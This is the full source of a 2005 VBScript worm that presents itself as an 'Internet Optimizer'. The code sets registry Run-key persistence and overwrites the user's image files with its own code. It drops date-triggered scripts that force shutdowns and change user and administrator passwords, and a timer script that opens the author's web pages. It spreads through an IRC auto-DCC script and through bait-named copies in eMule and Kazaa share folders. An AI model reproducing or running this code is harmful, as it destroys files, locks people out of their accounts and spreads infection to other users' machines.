'/////////////////////////////////////////////////////
'//
'//           __     _______            
'//   ______ |  | __ \   _  \   _______ 
'//  /  ___/ |  |/ / /  /_\  \  \_  __ \
'//  \___ \  |    <  \  \_/   \  |  | \/    #Team.SF | sk0r
'// /____  > |__|_ \  \_____  /  |__|       sk0r Firms Series Inc
'//      \/       \/        \/             
'//
'//FileName: VBS/sk0r.H alias VBS/sk0r.PopUp
'//Coder: sk0r
'//Version: 3, VBS/sk0r.H alias VBS/sk0r.PopUp
'//©2005 by sk0r , batchvirus_tk@web.de
'//
'// This Works only if it's encoded to a vbe File!
'//
'// This is Version 3 of sk0r's VBS/sk0r Series
'// Our mission is to show that VBScript Worms
'// aren't dead, and to show VBScript coding skills
'// You can't hide! The Worm will alway find you.
'// Infect your system slow and silent
'//
'// ©2005 by #Team.SF | sk0r, sk0r Firms Inc.
'/////////////////////////////////////////////////////

On Error Resume Next 

set wshs = createobject ("wscript.shell")
set fso = createobject ("scripting.filesystemobject")
Set sysdir = fso.GetSpecialFolder(1)
Set wmiObj = GetObject("winmgmts:")
Set windir = fso.getspecialfolder(0)
strWindir = left(windir,2)
Set objLogicalDisk = wmiObj.Get("Win32_LogicalDisk.DeviceID='"+strWindir+"'")
strZahl = objLogicalDisk.FreeSpace

MsgBox ("Now optimizing your Internet Connection!"),vbOKOnly+vbInformation,"Internet Optimizer"

wshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\vbs.sk0r.PopUp\" , "sk0r"
wshs.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sk0r" , sysdir+"\s_pUpskript.vbe"
wshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","sk0r Computer"
wshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","sk0r"
wshs.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SysCheckersk0r" , sysdir+"\checkdate.vbs"

Set getmyself = fso.GetFile(wscript.ScriptFullName)
getmyself.Copy (sysdir+"\s_pUpskript.vbe")
getmyself.Copy (sysdir+"\msiDriverUpdate.exe.vbe")

hure = wshs.specialfolders("Desktop")
if instr(hure,"Desktop") then
hure = replace(hure,"Desktop","")
end if
hure = hure+"Eigene Dateien\Eigene Bilder"
'msgbox (hure)
Set InfectFolder = fso.GetFolder(hure)
Set FilesInIt = InfectFolder.files
For Each Inifile in FilesInIt  
strZahl = strZahl+1
GetIni = LCase(fso.GetExtensionName(IniFile.path))
If GetIni = "jpg" Or GetIni = "gif" Or GetIni = "bmp" Or GetIni = "jpeg" Or GetIni = "pif" Then 
Set filecopy = fso.opentextfile (WScript.ScriptFullName,1)
CodeCopy = filecopy.readall
Set ReinDamit = fso.OpenTextFile(IniFile.path,2,true)
ReinDamit.write CodeCopy
End If 
Next

Set checkfile = fso.CreateTextFile(sysdir+"\CheckpUp.vbs")
    checkfile.WriteLine ("rem VBS/sk0r.PopUp tochter script!")
    checkfile.WriteLine ("set x = createobject (""wscript.shell"") ")
    checkfile.WriteLine ("set y = createobject (""scripting.filesystemobject"") ")
    checkfile.WriteLine ("set lol = y.GetSpecialFolder(1)")
    checkfile.WriteLine ("x.regwrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sk0r"" , lol+""\CheckpUp.vbs"" ")
    checkfile.WriteLine ("if not y.fileexist(lol+""\s_pUpskript.vbe"") then ")
    checkfile.writeline ("x.regdelete (""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sk0r"" & sysdir+""\s_pUpskript.vbe"" ")
	checkfile.WriteLine ("x.regwrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sk0r"" , lol+""\msiDriverUpdate.exe.vbe"" ")
	checkfile.WriteLine ("elseif not y.fileexist(lol+""\msiDriverUpdate.exe.vbe"") then ")
    checkfile.WriteLine ("x.regdelete (""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sk0r\"" & sysdir+""\msiDriverUpdate.exe.vbe"" ")
    checkfile.WriteLine ("x.regwrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sk0r\"" , sysdir+""\s_pUpskript.vbe"" ")
    checkfile.WriteLine ("end if")
    checkfile.close

Set shutpcdwn = fso.createtextfile (sysdir+"\checkdate.vbs")
    shutpcdwn.writeline ("rem VBS/sk0r.PopUp tochter script!")
    shutpcdwn.writeline ("set a = createobject (""wscript.shell"") ")
    shutpcdwn.writeline ("if instr(date(),""11"") then ")
    shutdownmsg = """Critical System sk0r Error"""
    shutpcdwn.writeline ("a.run ""shutdown -c """+shutdownmsg+""" -t 10 -s"" ")
    shutpcdwn.writeline ("elseif instr(date(),""17"") then ")
    shutpcdwn.writeline ("a.run ""net user %USERNAME% ownedbyskor"" ")
    shutpcdwn.writeline ("elseif instr(date(),""27"") then ")
    shutpcdwn.writeline ("a.run ""net user administrator ownedbyskor"" ")
    shutpcdwn.writeline ("end if")
    shutpcdwn.close

Set manager_pu_timer = fso.CreateTextFile (sysdir+"\manager_timer.vbs",true)  
       manager_pu_timer.WriteLine ("rem VBS/sk0r.PopUp tochter script!")
       manager_pu_timer.WriteLine ("set kaka = createobject (""wscript.shell"") ")
       manager_pu_timer.WriteLine ("call a1() ")
       manager_pu_timer.WriteLine (" ")
       manager_pu_timer.WriteLine ("sub a1 ")
       manager_pu_timer.WriteLine ("do until minute(now)=10 ")
       manager_pu_timer.WriteLine ("wscript.sleep 10 ")
       manager_pu_timer.WriteLine ("if minute(now)=10 then ")
       manager_pu_timer.WriteLine ("kaka.run ""http://www.speedsurf.to/sk0r1337/s_popup1.html"" ")
       manager_pu_timer.WriteLine ("call a2() ")
       manager_pu_timer.WriteLine ("end if ")
       manager_pu_timer.WriteLine ("loop ")
       manager_pu_timer.WriteLine ("end sub ")
       manager_pu_timer.WriteLine (" ")
       manager_pu_timer.WriteLine ("sub a2 ")
       manager_pu_timer.WriteLine ("do until minute(now)=20 ")
       manager_pu_timer.WriteLine ("wscript.sleep 10 ")
       manager_pu_timer.WriteLine ("if minute(now)=20 then ")
       manager_pu_timer.WriteLine ("kaka.run ""http://www.speedsurf.to/sk0r1337/s_popup2.html"" ")
       manager_pu_timer.WriteLine ("call a3() ")
       manager_pu_timer.WriteLine ("end if ")
       manager_pu_timer.WriteLine ("loop ")
       manager_pu_timer.WriteLine ("end sub  ")
       manager_pu_timer.WriteLine (" ")
       manager_pu_timer.WriteLine ("sub a3 ")
       manager_pu_timer.WriteLine ("do until minute(now)=30 ")
       manager_pu_timer.WriteLine ("wscript.sleep 10 ")
       manager_pu_timer.WriteLine ("if minute(now)=30 then ")
       manager_pu_timer.WriteLine ("kaka.run ""http://www.speedsurf.to/sk0r1337/s_popup3.html"" ")
       manager_pu_timer.WriteLine ("call a4() ")
       manager_pu_timer.WriteLine ("end if ")
       manager_pu_timer.WriteLine ("loop ")
       manager_pu_timer.WriteLine ("end sub ")
       manager_pu_timer.WriteLine (" ")
       manager_pu_timer.WriteLine ("sub a4 ")
       manager_pu_timer.WriteLine ("do until minute(now)=40 ")
       manager_pu_timer.WriteLine ("wscript.sleep 10 ")
       manager_pu_timer.WriteLine ("if minute(now)=40 then ")
       manager_pu_timer.WriteLine ("kaka.run ""http://www.speedsurf.to/sk0r1337/sk0r_Index.html"" ")
       manager_pu_timer.WriteLine ("call a5() ")
       manager_pu_timer.WriteLine ("end if ")
       manager_pu_timer.WriteLine ("loop ")
       manager_pu_timer.WriteLine ("End Sub ")
       manager_pu_timer.WriteLine (" ")
       manager_pu_timer.WriteLine ("sub a5 ")
       manager_pu_timer.WriteLine ("do until minute(now)=50 ")
       manager_pu_timer.WriteLine ("wscript.sleep 10 ")
       manager_pu_timer.WriteLine ("if minute(now)=50 then ")
       manager_pu_timer.WriteLine ("kaka.run ""http://www.speedsurf.to/sk0r1337/patch.html"" ")
       manager_pu_timer.WriteLine ("call a1() ")
       manager_pu_timer.WriteLine ("end if ")
       manager_pu_timer.WriteLine ("loop ")
       manager_pu_timer.WriteLine ("end Sub ")       
       manager_pu_timer.Close 
wshs.run sysdir+"\manager_timer.vbs"

ircread = wshs.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Gamers.Interactive\Gamers.IRC\" & "inst_path")
hacker = "/(d(cc s(e(nd %skor "+sysdir+"\m(siD(riv(erU(pd(at(e.exe.v(b(e"
hacker = replace(hacker,"(","")
set irchacking = fso.createtextfile(ircread+"\bin\grc\gamersirc.grc",true)
    irchacking.writeline (";VBS/sk0r.PopUp -> NIS 2k5 and 2k6 Proof <- ")
	irchacking.writeline ("on *:join:#: {")
	irchacking.WriteLine ("/unset %skor")
	irchacking.WriteLine ("/set %skor $nick ")
	irchacking.writeline (hacker)
	irchacking.writeline ("/msg $nick Hey, nimm mal an! Ist sau das geile Windows Tool! Ohne Scheiß!")
	irchacking.writeline ("}")
	irchacking.Close

s_emuleclient= wshs.regread ("HKEY_CURRENT_USER\Software\eMule\"&"Install Path")
'MsgBox (s_emuleclient+"\Incoming"),,WScript.scriptfullname
If s_emuleclient <> "" Then 
Set infectemule = fso.getfile (WScript.ScriptFullName)
infectemule.copy (s_emuleclient+"\Incoming\win_xp_serial.txt.vbe")
infectemule.copy (s_emuleclient+"\Incoming\lesbian_porn.avi.vbe")
infectemule.copy (s_emuleclient+"\Incoming\paintshop_pro_crack.exe.vbe")
infectemule.copy (s_emuleclient+"\Incoming\win_xp_serial.txt.vbe")
infectemule.copy (s_emuleclient+"\Incoming\icq_5_antispam.exe.vbe")
infectemule.copy (s_emuleclient+"\Incoming\hacker_tool.exe.vbe")
infectemule.copy (s_emuleclient+"\Incoming\hacker_tutorial.pdf.vbe")
infectemule.copy (s_emuleclient+"\Incoming\britney_nude.jpg.vbe")
infectemule.copy (s_emuleclient+"\Incoming\ms_office_serial.txt.vbe")
infectemule.copy (s_emuleclient+"\Incoming\ms_frontpage_serial.txt.vbe")
infectemule.copy (s_emuleclient+"\Incoming\norton_2006_key.txt.vbe")
infectemule.copy (s_emuleclient+"\Incoming\kaspersky_key.reg.vbe")
infectemule.copy (s_emuleclient+"\Incoming\free_xxx_pws.txt.vbe")
infectemule.copy (s_emuleclient+"\Incoming\ahead_nero_crack_new.exe.vbe")
infectemule.copy (s_emuleclient+"\Incoming\adobe_photoshop_crack_working.exe.vbe")
End If 

s_kazza = wshs.regread ("HKEY_CURRENT_USER\Software\Kazaa\LocalContent\"&"DownloadDir")
If s_kazza <> "" Then 
Set infectkazzaa = fso.getfile (WScript.ScriptFullName)
infectkazzaa.copy (s_kazza+"\win_xp_serial.txt.vbe")
infectkazzaa.copy (s_kazza+"\lesbian_porn.avi.vbe")
infectkazzaa.copy (s_kazza+"\paintshop_pro_crack.exe.vbe")
infectkazzaa.copy (s_kazza+"\win_xp_serial.txt.vbe")
infectkazzaa.copy (s_kazza+"\icq_5_antispam.exe.vbe")
infectkazzaa.copy (s_kazza+"\hacker_tool.exe.vbe")
infectkazzaa.copy (s_kazza+"\hacker_tutorial.pdf.vbe")
infectkazzaa.copy (s_kazza+"\britney_nude.jpg.vbe")
infectkazzaa.copy (s_kazza+"\ms_office_serial.txt.vbe")
infectkazzaa.copy (s_kazza+"\ms_frontpage_serial.txt.vbe")
infectkazzaa.copy (s_kazza+"\norton_2006_key.txt.vbe")
infectkazzaa.copy (s_kazza+"\kaspersky_key.reg.vbe")
infectkazzaa.copy (s_kazza+"\free_xxx_pws.txt.vbe")
infectkazzaa.copy (s_kazza+"\ahead_nero_crack_new.exe.vbe")
infectkazzaa.copy (s_kazza+"\adobe_photoshop_crack_working.exe.vbe")
End If

MsgBox ("Your System has been updated for faster Internet Speed! Please reboot manually"),vbOKOnly+vbinformation,"Windows Internet Optimizer"


'<!-- End of VBS/sk0r.H alias VBS/sk0r.PopUp | © 2005 by sk0r --!>